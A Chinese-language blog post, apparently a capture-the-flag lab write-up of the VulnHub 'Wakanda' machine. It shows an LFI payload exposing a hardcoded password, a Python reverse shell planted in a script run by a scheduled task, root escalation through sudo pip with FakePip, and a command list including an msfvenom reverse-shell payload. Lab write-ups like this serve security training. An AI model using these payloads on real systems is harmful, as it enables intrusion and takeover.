@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透测试,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="wakanda writeup靶机下载学到的姿势  从python命令提示符到交互式shell 查找属于某用户的所有文件 用python开启HTTP服务 fakepip  将靶机和攻击机设置为桥接，通过扫描即可发现靶机(vmware需要先设置桥接绑定的网卡，否则攻击机可能会无法联网)然后nmap开路发现开放了四个端口：80，111，3333，44086首先查看http服务，随便点点都没有什么反应查">
+<meta name="keywords" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wakanda writeup">
+<meta property="og:url" content="http://yoursite.com/2019/07/07/wakanda/index.html">
+<meta property="og:site_name" content="Moyu&#39;s blog">
+<meta property="og:description" content="wakanda writeup靶机下载学到的姿势  从python命令提示符到交互式shell 查找属于某用户的所有文件 用python开启HTTP服务 fakepip  将靶机和攻击机设置为桥接，通过扫描即可发现靶机(vmware需要先设置桥接绑定的网卡，否则攻击机可能会无法联网)然后nmap开路发现开放了四个端口：80，111，3333，44086首先查看http服务，随便点点都没有什么反应查">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/arp-scan-1.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/nmap.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/eng.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/html.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/fr.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/ssh.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/pshell.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/sumo.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/etc.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/findfile.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/catpy.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/revshell.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/flag2.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/su.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/fakepip.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/pyhttp.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/wget.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/runfakepip.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/root.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/07/07/wakanda/final.PNG">
+<meta property="og:updated_time" content="2019-07-07T02:57:58.942Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="wakanda writeup">
+<meta name="twitter:description" content="wakanda writeup靶机下载学到的姿势  从python命令提示符到交互式shell 查找属于某用户的所有文件 用python开启HTTP服务 fakepip  将靶机和攻击机设置为桥接，通过扫描即可发现靶机(vmware需要先设置桥接绑定的网卡，否则攻击机可能会无法联网)然后nmap开路发现开放了四个端口：80，111，3333，44086首先查看http服务，随便点点都没有什么反应查">
+<meta name="twitter:image" content="http://yoursite.com/2019/07/07/wakanda/arp-scan-1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/07/wakanda/">
+
+
+
+
+
+  <title>wakanda writeup | Moyu's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Moyu's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/07/wakanda/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Moyu">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/wlp.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyu's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">wakanda writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-07T10:48:46+08:00">
+                2019-07-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  772
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="wakanda-writeup"><a href="#wakanda-writeup" class="headerlink" title="wakanda writeup"></a>wakanda writeup</h1><p><a href="https://www.vulnhub.com/entry/wakanda-1,251/" target="_blank" rel="noopener">靶机下载</a><br>学到的姿势</p>
+<ul>
+<li>从python命令提示符到交互式shell</li>
+<li>查找属于某用户的所有文件</li>
+<li>用python开启HTTP服务</li>
+<li>fakepip</li>
+</ul>
+<p>将靶机和攻击机设置为桥接，通过扫描即可发现靶机(vmware需要先设置桥接绑定的网卡，否则攻击机可能会无法联网)<br><img src="arp-scan-1.PNG" alt="arp-scan-1"><br>然后nmap开路<br><img src="nmap.PNG" alt="nmap"><br>发现开放了四个端口：80，111，3333，44086<br>首先查看http服务，随便点点都没有什么反应<br><img src="eng.PNG" alt="eng"><br>查看一下源码，发现有一行很奇怪<br><img src="html.PNG" alt="html"><br>传递参数后发现页面变成了法语<br><img src="fr.PNG" alt="fr"><br>尝试一下LFI，发现会在最后添加php，payload如下<br><code>?lang=php://filter/convert.base64-encode/resource=index</code><br>解码后得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember it</span><br><span class="line">	if (isset($_GET[&apos;lang&apos;]))&#123;</span><br><span class="line">		include($_GET[&apos;lang&apos;].&quot;.php&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有一个password，推测可能是ssh登陆的password，尝试用网页上的用户名<code>mamadou</code>登陆ssh，成功<br><img src="ssh.PNG" alt="ssh"><br>从python命令提示符到交互式shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import ptypty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="pshell.PNG" alt="pshell"><br>首先看一看可以用sudo执行的命令<br><img src="sumo.PNG" alt="sumo"><br>发现无法执行，只能尝试用其他用户提权，查看其他用户<br><img src="etc.PNG" alt="etc"><br>发现有其他用户<code>devops</code>，尝试查找该用户的所有文件(注：此处有的setup.py原本并没有，后续会提到)<br><img src="findfile.PNG" alt="findfile"><br>命令解释：2为文件描述符，表示错误输出；/dev/null表示丢弃一切写入其中的数据，所以这样写会忽略所有报错信息<br>然后查看py文件，发现是向某一个文件夹写文件<br><img src="catpy.PNG" alt="catpy"><br>把写入的文件删掉，过一段时间发现又有了，推测可能是后台有定时任务，一直在执行这个py文件，我们可以用来反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;192.168.1.101&quot;,7777))</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure>
+
+<p><img src="revshell.PNG" alt="revshell"><br>读取flag2<br><img src="flag2.PNG" alt="flag2"><br>接下来就该尝试提权到root了，同样，我们看一看可以sudo执行的命令<br><img src="su.PNG" alt="su"><br>发现有pip，google搜一波，发现有一个叫FakePip的<a href="https://github.com/0x00-0x00/FakePip" target="_blank" rel="noopener">脚本</a>，尝试一下，首先在攻击机上把脚本下载下来，然后更改<code>setup.py</code><br><img src="fakepip.PNG" alt="fakepip"><br>然后开启HTTP服务，就可以把攻击机里的脚本传到靶机里<br><img src="pyhttp.PNG" alt="pyhttp"><br><img src="wget.PNG" alt="wget"><br>这样我们就在靶机里得到了setup.py<br>首先在攻击机监听4444端口，然后根据readme里边的用法说明直接执行命令就可以了<br><img src="runfakepip.PNG" alt="runfakepip"><br>可以看到，我们现在已经获取了root权限<br><img src="root.PNG" alt="root"><br>最后，到根目录读取flag即可，本次靶机渗透测试也就结束了<br><img src="final.PNG" alt="final"></p>
+<p>命令备忘</p>
+<ul>
+<li>?lang=php://filter/convert.base64-encode/resource=index</li>
+<li>ssh <a href="mailto:mamadou@192.168.43.199" target="_blank" rel="noopener">mamadou@192.168.43.199</a> -p 3333</li>
+<li>从python命令提示符到交互式shell：import pty pty.spawn(“/bin/bash”)</li>
+<li>查找属于某用户的所有文件：find / -user devops 2&gt;/dev/null</li>
+<li>生成msfvenom的反弹shell payload：msfvenom -p cmd/unix/reverse_python lhost=192.168.43.242 lport=2333 R</li>
+<li>查看该用户能用sudo执行的命令：sudo -l</li>
+<li>本地用python开启HTTP服务：python -m SimpleHTTPServer 80</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/07/teaser/" rel="next" title="Teaser CONFidence CTF 2019 web writeup">
+                <i class="fa fa-chevron-left"></i> Teaser CONFidence CTF 2019 web writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/07/计算机组成原理/" rel="prev" title="计算机组成原理">
+                计算机组成原理 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/wlp.jpg" alt="Moyu">
+            
+              <p class="site-author-name" itemprop="name">Moyu</p>
+              <p class="site-description motion-element" itemprop="description">hack for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#wakanda-writeup"><span class="nav-number">1.</span> <span class="nav-text">wakanda writeup</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Moyu</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
